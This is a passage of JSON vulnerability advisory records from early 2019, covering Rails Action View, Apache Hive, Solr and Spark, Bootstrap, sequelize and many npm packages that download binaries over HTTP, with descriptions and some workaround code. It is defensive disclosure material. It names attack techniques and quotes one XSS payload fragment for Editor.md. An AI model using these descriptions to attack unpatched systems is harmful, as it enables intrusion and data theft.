    "publishedAt": "2019-03-25T16:15:54Z",
    "description": "Doorkeeper::OpenidConnect (aka the OpenID Connect extension for Doorkeeper) 1.4.x and 1.5.x before 1.5.4 has an open redirect via the redirect_uri field in an OAuth authorization request (that results in an error response) with the 'openid' scope and a prompt=none value. This allows phishing attacks against the authorization flow.",
    "summary": "Moderate severity vulnerability that affects doorkeeper-openid_connect"
  },
  {
    "ghsaId": "GHSA-73rf-6mrf-759q",
    "publishedAt": "2019-03-19T18:03:25Z",
    "description": "Devise ruby gem before 4.6.0 when the `lockable` module is used is vulnerable to a time-of-check time-of-use (TOCTOU) race condition due to `increment_failed_attempts` within the `Devise::Models::Lockable` class not being concurrency safe.",
    "summary": "Moderate severity vulnerability that affects devise"
  },
  {
    "ghsaId": "GHSA-xmc8-cjfr-phx3",
    "publishedAt": "2019-03-18T15:59:32Z",
    "description": "In js/parts/SvgRenderer.js in Highcharts JS before 6.1.0, the use of backtracking regular expressions permitted an attacker to conduct a denial of service attack against the SVGRenderer component, aka ReDoS.",
    "summary": "High severity vulnerability that affects highcharts"
  },
  {
    "ghsaId": "GHSA-h436-432x-8fvx",
    "publishedAt": "2019-03-14T15:41:12Z",
    "description": "A specially crafted ZIP archive can be used to cause an infinite loop inside of Apache Commons Compress' extra field parser used by the ZipFile and ZipArchiveInputStream classes in versions 1.11 to 1.15. This can be used to mount a denial of service attack against services that use Compress' zip package.",
    "summary": "High severity vulnerability that affects org.apache.commons:commons-compress"
  },
  {
    "ghsaId": "GHSA-6mqq-8r44-vmjc",
    "publishedAt": "2019-03-14T15:41:04Z",
    "description": "In Apache Spark 1.0.0 to 2.1.2, 2.2.0 to 2.2.1, and 2.3.0, when using PySpark or SparkR, it's possible for a different local user to connect to the Spark application and impersonate the user running the Spark application.",
    "summary": "Low severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-8cw6-5qvp-q3wj",
    "publishedAt": "2019-03-14T15:40:57Z",
    "description": "In Apache Spark 2.1.0 to 2.1.2, 2.2.0 to 2.2.1, and 2.3.0, it's possible  for a malicious user to construct a URL pointing to a Spark cluster's UI's  job and stage info pages, and if a user can be tricked into accessing  the URL, can be used to cause script to execute and expose information  from the user's view of the Spark UI. While some browsers like recent  versions of Chrome and Safari are able to block this type of attack,  current versions of Firefox (and possibly others) do not.",
    "summary": "Low severity vulnerability that affects org.apache.spark:spark-core_2.10 and org.apache.spark:spark-core_2.11"
  },
  {
    "ghsaId": "GHSA-5gvm-hrw5-h6xf",
    "publishedAt": "2019-03-14T15:40:44Z",
    "description": "The LDAP implementation in HiveServer2 in Apache Hive before 1.0.1 and 1.1.x before 1.1.1, as used in IBM InfoSphere BigInsights 3.0, 3.0.0.1, and 3.0.0.2 and other products, mishandles simple unauthenticated and anonymous bind configurations, which allows remote attackers to bypass authentication via a crafted LDAP request.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-gf2v-9hp6-44qg",
    "publishedAt": "2019-03-14T15:40:32Z",
    "description": "Apache Hive (JDBC + HiveServer2) implements SSL for plain TCP and HTTP connections (it supports both transport modes). While validating the server's certificate during the connection setup, the client in Apache Hive before 1.2.2 and 2.0.x before 2.0.1 doesn't seem to be verifying the common name attribute of the certificate. In this way, if a JDBC client sends an SSL request to server abc.com, and the server responds with a valid certificate (certified by CA) but issued to xyz.com, the client will accept that as a valid certificate and the SSL handshake will go through.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-2g9q-chq2-w8qw",
    "publishedAt": "2019-03-14T15:40:16Z",
    "description": "Apache Hive 2.1.x before 2.1.2, 2.2.x before 2.2.1, and 2.3.x before 2.3.1 expose an interface through which masking policies can be defined on tables or views, e.g., using Apache Ranger. When a view is created over a given table, the policy enforcement does not happen correctly on the table for masked columns.",
    "summary": "Moderate severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service"
  },
  {
    "ghsaId": "GHSA-vrh8-27q8-fr8f",
    "publishedAt": "2019-03-14T15:39:56Z",
    "description": "Server Side Request Forgery in Apache Solr, versions 1.3 until 7.6 (inclusive). Since the \"shards\" parameter does not have a corresponding whitelist mechanism, a remote attacker with access to the server could make Solr perform an HTTP GET request to any reachable URL.",
    "summary": "Low severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-xhcq-fv7x-grr2",
    "publishedAt": "2019-03-14T15:39:45Z",
    "description": "In Apache Solr versions 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5, the Config API allows to configure the JMX server via an HTTP POST request. By pointing it to a malicious RMI server, an attacker could take advantage of Solr's unsafe deserialization to trigger remote code execution on the Solr side.",
    "summary": "Critical severity vulnerability that affects org.apache.solr:solr-core"
  },
  {
    "ghsaId": "GHSA-77rv-6vfw-x4gc",
    "publishedAt": "2019-03-14T15:39:30Z",
    "description": "Spring Security OAuth, versions 2.3 prior to 2.3.5, and 2.2 prior to 2.2.4, and 2.1 prior to 2.1.4, and 2.0 prior to 2.0.17, and older unsupported versions could be susceptible to an open redirector attack that can leak an authorization code.\r\n\r\nA malicious user or attacker can craft a request to the authorization endpoint using the authorization code grant type, and specify a manipulated redirection URI via the \"redirect_uri\" parameter. This can cause the authorization server to redirect the resource owner user-agent to a URI under the control of the attacker with the leaked authorization code.\r\n\r\nThis vulnerability exposes applications that meet all of the following requirements: Act in the role of an Authorization Server (e.g. @EnableAuthorizationServer) and uses the DefaultRedirectResolver in the AuthorizationEndpoint. \r\n\r\nThis vulnerability does not expose applications that: Act in the role of an Authorization Server and uses a different RedirectResolver implementation other than DefaultRedirectResolver, act in the role of a Resource Server only (e.g. @EnableResourceServer), act in the role of a Client only (e.g. @EnableOAuthClient).",
    "summary": "Critical severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth and org.springframework.security.oauth:spring-security-oauth2"
  },
  {
    "ghsaId": "GHSA-gp32-7h29-rpxm",
    "publishedAt": "2019-03-14T15:39:14Z",
    "description": "Checkstyle prior to 8.18 loads external DTDs by default, which can potentially lead to denial of service attacks or the leaking of confidential information.",
    "summary": "Moderate severity vulnerability that affects com.puppycrawl.tools:checkstyle"
  },
  {
    "ghsaId": "GHSA-2j5v-fc74-j9q2",
    "publishedAt": "2019-03-14T15:38:56Z",
    "description": "Editor.md 1.5.0 has DOM-based XSS via vectors involving the '<EMBED SRC=\"data:image/svg+xml' substring.",
    "summary": "Moderate severity vulnerability that affects editor.md"
  },
  {
    "ghsaId": "GHSA-m42h-mh85-4qgc",
    "publishedAt": "2019-03-13T17:28:35Z",
    "description": "# Possible Remote Code Execution Exploit in Rails Development Mode\r\n\r\nImpact \r\n------ \r\nWith some knowledge of a target application it is possible for an attacker to \r\nguess the automatically generated development mode secret token.  This secret \r\ntoken can be used in combination with other Rails internals to escalate to a \r\nremote code execution exploit. \r\n\r\nAll users running an affected release should either upgrade or use one of the \r\nworkarounds immediately. \r\n\r\nReleases \r\n-------- \r\nThe 6.0.0.beta3 and 5.2.2.1 releases are available at the normal locations. \r\n\r\nWorkarounds \r\n----------- \r\nThis issue can be mitigated by specifying a secret key in development mode. \r\nIn \"config/environments/development.rb\" add this: \r\n\r\n```\r\n  config.secret_key_base = SecureRandom.hex(64) \r\n```\r\n\r\nPlease note that only the 5.2.x, 5.1.x, 5.0.x, and 4.2.x series are supported \r\nat present. Users of earlier unsupported releases are advised to upgrade as \r\nsoon as possible as we cannot guarantee the continued availability of security \r\nfixes for unsupported releases. \r\n\r\nCredits \r\n------- \r\nThanks to ooooooo_q \r\n",
    "summary": "Moderate severity vulnerability that affects railties"
  },
  {
    "ghsaId": "GHSA-86g5-2wh3-gc9j",
    "publishedAt": "2019-03-13T17:26:59Z",
    "description": "# File Content Disclosure in Action View\r\n\r\nImpact \r\n------ \r\nThere is a possible file content disclosure vulnerability in Action View. \r\nSpecially crafted accept headers in combination with calls to `render file:` \r\ncan cause arbitrary files on the target server to be rendered, disclosing the \r\nfile contents. \r\n\r\nThe impact is limited to calls to `render` which render file contents without \r\na specified accept format.  Impacted code in a controller looks something like \r\nthis: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n    render file: \"#{Rails.root}/some/file\" \r\n  end \r\nend \r\n``` \r\n\r\nRendering templates as opposed to files is not impacted by this vulnerability. \r\n\r\nAll users running an affected release should either upgrade or use one of the \r\nworkarounds immediately. \r\n\r\nReleases \r\n-------- \r\nThe 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, and 4.2.11.1 releases are \r\navailable at the normal locations. \r\n\r\nWorkarounds \r\n----------- \r\nThis vulnerability can be mitigated by specifying a format for file rendering, \r\nlike this: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n    render file: \"#{Rails.root}/some/file\", formats: [:html] \r\n  end \r\nend \r\n``` \r\n\r\nIn summary, impacted calls to `render` look like this: \r\n\r\n``` \r\nrender file: \"#{Rails.root}/some/file\" \r\n``` \r\n\r\nThe vulnerability can be mitigated by changing to this: \r\n\r\n``` \r\nrender file: \"#{Rails.root}/some/file\", formats: [:html] \r\n``` \r\n\r\nOther calls to `render` are not impacted. \r\n\r\nAlternatively, the following monkey patch can be applied in an initializer: \r\n\r\n``` \r\n$ cat config/initializers/formats_filter.rb \r\n# frozen_string_literal: true \r\n\r\nActionDispatch::Request.prepend(Module.new do \r\n  def formats \r\n    super().select do |format| \r\n      format.symbol || format.ref == \"*/*\" \r\n    end \r\n  end \r\nend) \r\n``` \r\n\r\nCredits \r\n------- \r\nThanks to John Hawthorn <john@hawthorn.email> of GitHub ",
    "summary": "Critical severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-m63j-wh5w-c252",
    "publishedAt": "2019-03-13T17:25:55Z",
    "description": "# Denial of Service Vulnerability in Action View\r\n\r\nImpact \r\n------ \r\nSpecially crafted accept headers can cause the Action View template location \r\ncode to consume 100% CPU, causing the server unable to process requests.  This \r\nimpacts all Rails applications that render views. \r\n\r\nAll users running an affected release should either upgrade or use one of the \r\nworkarounds immediately. \r\n\r\nReleases \r\n-------- \r\nThe 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, and 4.2.11.1 releases are \r\navailable at the normal locations. \r\n\r\nWorkarounds \r\n----------- \r\nThis vulnerability can be mitigated by wrapping `render` calls with \r\n`respond_to` blocks.  For example, the following example is vulnerable: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n    render \"index\" \r\n  end \r\nend \r\n``` \r\n\r\nBut the following code is not vulnerable: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n    respond_to |format| \r\n      format.html { render \"index\" } \r\n    end \r\n  end \r\nend \r\n``` \r\n\r\nImplicit rendering is impacted, so this code is vulnerable: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n  end \r\nend \r\n``` \r\n\r\nBut can be changed this this: \r\n\r\n``` \r\nclass UserController < ApplicationController \r\n  def index \r\n    respond_to |format| \r\n      format.html { render \"index\" } \r\n    end \r\n  end \r\nend \r\n``` \r\n\r\nAlternatively to specifying the format, the following monkey patch can be \r\napplied in an initializer: \r\n\r\n``` \r\n$ cat config/initializers/formats_filter.rb \r\n# frozen_string_literal: true \r\n\r\nActionDispatch::Request.prepend(Module.new do \r\n  def formats \r\n    super().select do |format| \r\n      format.symbol || format.ref == \"*/*\" \r\n    end \r\n  end \r\nend) \r\n``` \r\n\r\nPlease note that only the 5.2.x, 5.1.x, 5.0.x, and 4.2.x series are supported \r\nat present. Users of earlier unsupported releases are advised to upgrade as \r\nsoon as possible as we cannot guarantee the continued availability of security \r\nfixes for unsupported releases. \r\n\r\nAlso note that the patches for this vulnerability are the same as CVE-2019-5418. \r\n\r\nCredits \r\n------- \r\nThanks to John Hawthorn <john@hawthorn.email> of GitHub ",
    "summary": "Critical severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-8554-jxcw-454q",
    "publishedAt": "2019-03-12T15:16:12Z",
    "description": "An issue was discovered in webargs before 5.1.3, as used with marshmallow and other products. JSON parsing uses a short-lived cache to store the parsed JSON body. This cache is not thread-safe, meaning that incorrect JSON payloads could have been parsed for concurrent requests.",
    "summary": "High severity vulnerability that affects webargs"
  },
  {
    "ghsaId": "GHSA-c9h6-xhg9-xxrv",
    "publishedAt": "2019-03-07T18:48:08Z",
    "description": "A Denial of Service vulnerability was found in Apache Qpid Broker-J versions 6.0.0-7.0.6 (inclusive) and 7.1.0 which allows an unauthenticated attacker to crash the broker instance by sending specially crafted commands using AMQP protocol versions below 1.0 (AMQP 0-8, 0-9, 0-91 and 0-10). Users of Apache Qpid Broker-J versions 6.0.0-7.0.6 (inclusive) and 7.1.0 utilizing AMQP protocols 0-8, 0-9, 0-91, 0-10 must upgrade to Qpid Broker-J versions 7.0.7 or 7.1.1 or later.",
    "summary": "Low severity vulnerability that affects org.apache.qpid:apache-qpid-broker-j"
  },
  {
    "ghsaId": "GHSA-wg37-7mrv-cfwm",
    "publishedAt": "2019-03-07T18:47:57Z",
    "description": "Unauthenticated RCE is possible when JMeter is used in distributed mode (-r or -R command line options). Attacker can establish a RMI connection to a jmeter-server using RemoteJMeterEngine and proceed with an attack using untrusted data deserialization. This only affect tests running in Distributed mode. Note that versions before 4.0 are not able to encrypt traffic between the nodes, nor authenticate the participating nodes so upgrade to JMeter 5.1 is also advised.",
    "summary": "Low severity vulnerability that affects org.apache.jmeter:ApacheJMeter"
  },
  {
    "ghsaId": "GHSA-p2xq-vcm7-xjj6",
    "publishedAt": "2019-03-06T17:36:22Z",
    "description": "When parsing a JSON payload with deeply nested JSON structures, the parser in Apache Mesos versions pre-1.4.x, 1.4.0 to 1.4.2, 1.5.0 to 1.5.1, 1.6.0 to 1.6.1, and 1.7.0 might overflow the stack due to unbounded recursion. A malicious actor can therefore cause a denial of service of Mesos masters rendering the Mesos-controlled cluster inoperable.",
    "summary": "Low severity vulnerability that affects org.apache.mesos:mesos"
  },
  {
    "ghsaId": "GHSA-pfwp-8pq4-g7pv",
    "publishedAt": "2019-03-06T17:36:08Z",
    "description": "SOFA-Hessian through 4.0.2 allows remote attackers to execute arbitrary commands via a crafted serialized Hessian object because blacklisting of com.caucho.naming.QName and com.sun.org.apache.xpath.internal.objects.XString is mishandled, related to Resin Gadget.",
    "summary": "Moderate severity vulnerability that affects com.alipay.sofa:hessian"
  },
  {
    "ghsaId": "GHSA-99cv-8cvv-666c",
    "publishedAt": "2019-03-06T17:35:58Z",
    "description": "In Apache Airflow before 1.10.2, a malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views.",
    "summary": "High severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-xgjc-49cw-529m",
    "publishedAt": "2019-03-06T17:35:49Z",
    "description": "An issue was discovered in b3log Symphony (aka Sym) before v3.4.7. XSS exists via the userIntro and userNickname fields to processor/SettingsProcessor.java.",
    "summary": "Moderate severity vulnerability that affects org.b3log:symphony"
  },
  {
    "ghsaId": "GHSA-fx7m-j728-mjw3",
    "publishedAt": "2019-03-06T17:35:47Z",
    "description": "An issue was discovered in regex.yaml (aka regexes.yaml) in UA-Parser UAP-Core before 0.6.0. A Regular Expression Denial of Service (ReDoS) issue allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to a value containing a long digit string. (The UAP-Core project contains the vulnerability, propagating to all implementations.)",
    "summary": "Moderate severity vulnerability that affects uap-core"
  },
  {
    "ghsaId": "GHSA-9v3m-8fp8-mj99",
    "publishedAt": "2019-02-22T20:54:47Z",
    "description": "In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",
    "summary": "Moderate severity vulnerability that affects bootstrap and bootstrap-sass"
  },
  {
    "ghsaId": "GHSA-fxwm-579q-49qq",
    "publishedAt": "2019-02-22T20:54:40Z",
    "description": "In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",
    "summary": "Moderate severity vulnerability that affects Bootstrap.Less, bootstrap, and bootstrap.sass"
  },
  {
    "ghsaId": "GHSA-wh77-3x4m-4q9g",
    "publishedAt": "2019-02-22T20:54:27Z",
    "description": "In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/",
    "summary": "Moderate severity vulnerability that affects bootstrap and bootstrap-sass"
  },
  {
    "ghsaId": "GHSA-3q32-j57w-q4w7",
    "publishedAt": "2019-02-20T15:40:13Z",
    "description": "index.js in Total.js Platform before 3.2.3 allows path traversal.",
    "summary": "High severity vulnerability that affects total.js"
  },
  {
    "ghsaId": "GHSA-6663-c963-2gqg",
    "publishedAt": "2019-02-18T23:58:35Z",
    "description": "ws is a \"simple to use, blazing fast and thoroughly tested websocket client, server and console for node.js, up-to-date against RFC-6455\". By sending an overly long websocket payload to a `ws` server, it is possible to crash the node process. This affects ws 1.1.0 and earlier.",
    "summary": "High severity vulnerability that affects ws"
  },
  {
    "ghsaId": "GHSA-qg8p-v9q4-gh34",
    "publishedAt": "2019-02-18T23:58:29Z",
    "description": "The npm module \"shell-quote\" 1.6.0 and earlier cannot correctly escape \">\" and \"<\" operator used for redirection in shell. Applications that depend on shell-quote may also be vulnerable. A malicious user could perform code injection.",
    "summary": "High severity vulnerability that affects shell-quote"
  },
  {
    "ghsaId": "GHSA-q43m-ffwr-rpcc",
    "publishedAt": "2019-02-18T23:58:24Z",
    "description": "electron-packager is a command line tool that packages Electron source code into `.app` and `.exe` packages. along with Electron. The `--strict-ssl` command line option in electron-packager >= 5.2.1 <= 6.0.0 || >=6.0.0 <= 6.0.2 defaults to false if not explicitly set to true. This could allow an attacker to perform a man in the middle attack.",
    "summary": "Low severity vulnerability that affects electron-packager"
  },
  {
    "ghsaId": "GHSA-vfvf-mqq8-rwqc",
    "publishedAt": "2019-02-18T23:58:20Z",
    "description": "marked is an application that is meant to parse and compile markdown. Due to the way that marked 0.3.5 and earlier parses input, specifically HTML entities, it's possible to bypass marked's content injection protection (`sanitize: true`) to inject a `javascript:` URL. This flaw exists because `&#xNNanything;` gets parsed to what it could and leaves the rest behind, resulting in just `anything;` being left.",
    "summary": "Moderate severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-856x-cp3q-47vg",
    "publishedAt": "2019-02-18T23:58:13Z",
    "description": "The airbrake module 0.3.8 and earlier defaults to sending environment variables over HTTP. Environment variables can often times contain secret keys and other sensitive values. A malicious user could be on the same network as a regular user and intercept all the secret keys the user is sending. This goes against common best practice, which is to use HTTPS.",
    "summary": "Moderate severity vulnerability that affects airbrake"
  },
  {
    "ghsaId": "GHSA-jh5w-6964-x5cf",
    "publishedAt": "2019-02-18T23:58:05Z",
    "description": "Chromedriver is an NPM wrapper for selenium ChromeDriver. Chromedriver before 2.26.1 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects chromedriver"
  },
  {
    "ghsaId": "GHSA-2hpj-g53m-9gj6",
    "publishedAt": "2019-02-18T23:58:03Z",
    "description": "closure-utils is Utilities for Closure Library based projects. closure-utils downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects closure-util"
  },
  {
    "ghsaId": "GHSA-899g-6q6w-7v94",
    "publishedAt": "2019-02-18T23:58:00Z",
    "description": "Path Traversal vulnerability in module m-server <1.4.1 allows malicious user to access unauthorized content of any file in the directory tree e.g. /etc/passwd by appending slashes to the URL request.",
    "summary": "Low severity vulnerability that affects m-server"
  },
  {
    "ghsaId": "GHSA-vvwp-3f54-xc39",
    "publishedAt": "2019-02-18T23:57:05Z",
    "description": "broccoli-closure is a Closure compiler plugin for Broccoli. broccoli-closure before 1.3.1 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects broccoli-closure"
  },
  {
    "ghsaId": "GHSA-4pf7-579w-f4gm",
    "publishedAt": "2019-02-18T23:57:04Z",
    "description": "dwebp-bin is a dwebp node.js wrapper that convert WebP into PNG. dwebp-bin downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects dwebp-bin"
  },
  {
    "ghsaId": "GHSA-qx9m-27wh-7fjg",
    "publishedAt": "2019-02-18T23:57:03Z",
    "description": "jvminstall is a module for downloading and unpacking jvm to local system. jvminstall downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects jvminstall"
  },
  {
    "ghsaId": "GHSA-9jf3-f2pg-7868",
    "publishedAt": "2019-02-18T23:57:01Z",
    "description": "nw-with-arm is a NW Installer including ARM-Build. nw-with-arm downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects nw-with-arm"
  },
  {
    "ghsaId": "GHSA-3vv5-42wr-m32g",
    "publishedAt": "2019-02-18T23:57:00Z",
    "description": "scala-bin is a binary wrapper for Scala. scala-bin downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects scala-bin"
  },
  {
    "ghsaId": "GHSA-g95j-p8f6-pwh4",
    "publishedAt": "2019-02-18T23:56:58Z",
    "description": "headless-browser-lite is a minimal npm installer for phantomjs and slimerjs with no external dependencies. headless-browser-lite downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects headless-browser-lite"
  },
  {
    "ghsaId": "GHSA-3c87-r9f7-qfgq",
    "publishedAt": "2019-02-18T23:56:56Z",
    "description": "macaca-chromedriver-zxa is a Node.js wrapper for the selenium chromedriver. macaca-chromedriver-zxa downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.\r\n\r\nThe best mitigation is to manually set the download URL to a safe HTTPS server via the CHROMEDRIVER_CDNURL environment variable.\r\n\r\n",
    "summary": "High severity vulnerability that affects macaca-chromedriver-zxa"
  },
  {
    "ghsaId": "GHSA-6p48-xfj3-jw67",
    "publishedAt": "2019-02-18T23:56:54Z",
    "description": "fibjs is a runtime for javascript applictions built on google v8 JS. fibjs downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects fibjs"
  },
  {
    "ghsaId": "GHSA-87g3-x896-w798",
    "publishedAt": "2019-02-18T23:56:53Z",
    "description": "atom-node-module-installer installs node modules for atom-shell applications. atom-node-module-installer binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects atom-node-module-installer"
  },
  {
    "ghsaId": "GHSA-x3j8-g4v9-67jq",
    "publishedAt": "2019-02-18T23:56:51Z",
    "description": "pennyworth is a natural language templating engine. pennyworth downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects pennyworth"
  },
  {
    "ghsaId": "GHSA-8r98-rqg5-4vm3",
    "publishedAt": "2019-02-18T23:56:50Z",
    "description": "node-browser is a wrapper webdriver by nodejs. node-browser downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects node-browser"
  },
  {
    "ghsaId": "GHSA-362x-34h3-h6h6",
    "publishedAt": "2019-02-18T23:56:48Z",
    "description": "box2d-native downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects box2d-native"
  },
  {
    "ghsaId": "GHSA-8p52-7cxv-6c95",
    "publishedAt": "2019-02-18T23:56:47Z",
    "description": "curses is bindings for the native curses library, a full featured console IO library. curses downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects curses"
  },
  {
    "ghsaId": "GHSA-735c-r4vc-6gm9",
    "publishedAt": "2019-02-18T23:56:45Z",
    "description": "bionode-sra is a Node.js wrapper for SRA Toolkit. bionode-sra downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects bionode-sra"
  },
  {
    "ghsaId": "GHSA-2mhh-w6q8-5hxw",
    "publishedAt": "2019-02-18T23:56:42Z",
    "description": "A vulnerability was found in the ping functionality of the ws module before 1.0.0 which allowed clients to allocate memory by sending a ping frame. The ping functionality by default responds with a pong frame and the previously given payload of the ping frame. This is exactly what you expect, but internally ws always transforms all data that we need to send to a Buffer instance and that is where the vulnerability existed. ws didn't do any checks for the type of data it was sending. With buffers in node when you allocate it when a number instead of a string it will allocate the amount of bytes.",
    "summary": "Moderate severity vulnerability that affects ws"
  },
  {
    "ghsaId": "GHSA-f757-9c4x-chff",
    "publishedAt": "2019-02-18T23:54:44Z",
    "description": "poco - The POCO libraries, downloads source file resources used for compilation over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects poco"
  },
  {
    "ghsaId": "GHSA-722q-3g9x-vp8q",
    "publishedAt": "2019-02-18T23:54:41Z",
    "description": "tomita-parser is a Node wrapper for Yandex Tomita Parser tomita-parser downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects tomita-parser"
  },
  {
    "ghsaId": "GHSA-3x83-p476-vv95",
    "publishedAt": "2019-02-18T23:54:40Z",
    "description": "selenium-standalone-painful installs a start-selenium command line to start a standalone selenium server with chrome-driver. selenium-standalone-painful downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects selenium-standalone-painful"
  },
  {
    "ghsaId": "GHSA-4v2c-g2xc-47fv",
    "publishedAt": "2019-02-18T23:54:38Z",
    "description": "massif is a Phantomjs fork massif downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Moderate severity vulnerability that affects massif"
  },
  {
    "ghsaId": "GHSA-98pq-pmw9-4gpm",
    "publishedAt": "2019-02-18T23:54:34Z",
    "description": "sequelize is an Object-relational mapping, or a middleman to convert things from Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server into usable data for NodeJS If user input goes into the `limit` or `order` parameters, a malicious user can put in their own SQL statements. This affects sequelize 3.16.0 and earlier.",
    "summary": "Moderate severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-2v7q-2xqx-f4q5",
    "publishedAt": "2019-02-18T23:54:32Z",
    "description": "sequelize is an Object-relational mapping, or a middleman to convert things from Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server into usable data for NodeJS. A fix was pushed out that fixed potential SQL injection in sequelize 2.1.3 and earlier.",
    "summary": "Moderate severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-cgpp-wm2h-6hqx",
    "publishedAt": "2019-02-18T23:54:28Z",
    "description": "waterline-sequel is a module that helps generate SQL statements for Waterline apps Any user input that goes into Waterline's `like`, `contains`, `startsWith`, or `endsWith` will end up in waterline-sequel with the potential for malicious code. A malicious user can input their own SQL statements in waterline-sequel 0.50 that will get executed and have full access to the database.",
    "summary": "SQL Injection in waterline-sequel"
  },
  {
    "ghsaId": "GHSA-x2jc-pwfj-h9p3",
    "publishedAt": "2019-02-18T23:54:28Z",
